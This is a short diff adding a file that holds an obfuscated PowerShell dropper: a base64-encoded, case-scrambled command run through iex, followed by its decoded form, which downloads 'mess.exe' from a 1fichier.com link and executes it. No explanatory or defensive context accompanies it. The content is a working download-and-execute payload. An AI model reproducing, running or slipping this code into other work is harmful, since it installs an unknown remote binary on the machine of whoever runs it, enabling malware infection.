@@ -1,0 +1,7 @@
+iex([SYsTEM.tEXT.eNcODiNG]::UtF8.GEtStrINg([SYSTEM.convErt]::FROmBAse64strinG('CihOZXctT2JqZWN0IHN5U1RlbS5uZXQud2VCQ2xJRW50KS5kb3dObE9BZGZJbGUoJ2h0dHBzOi8vMWZpY2hpZXIuY29tLz9oZnNoamhtMHlmJywnbWVzcy5leGUnKTtTdGFydC1Qcm9jZXNzICdtZXNzLmV4ZScKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sySTem.net.weBClIEnt).dowNlOAdfIle('https://1fichier.com/?hfshjhm0yf','mess.exe');Start-Process 'mess.exe'
+
